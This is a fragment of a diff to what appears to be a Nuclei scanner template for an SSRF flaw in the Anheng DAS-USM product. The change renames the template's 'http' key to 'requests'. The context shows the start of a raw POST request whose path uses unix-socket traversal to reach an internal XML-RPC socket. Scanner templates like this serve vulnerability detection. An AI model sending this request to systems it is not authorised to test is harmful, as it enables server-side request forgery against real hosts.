@@ -15,7 +15,7 @@ info:
     verified: true
   tags: 2023,anheng,DAS-USM,SSRF
 
-http:
+requests:
   - raw:
       - |
         POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
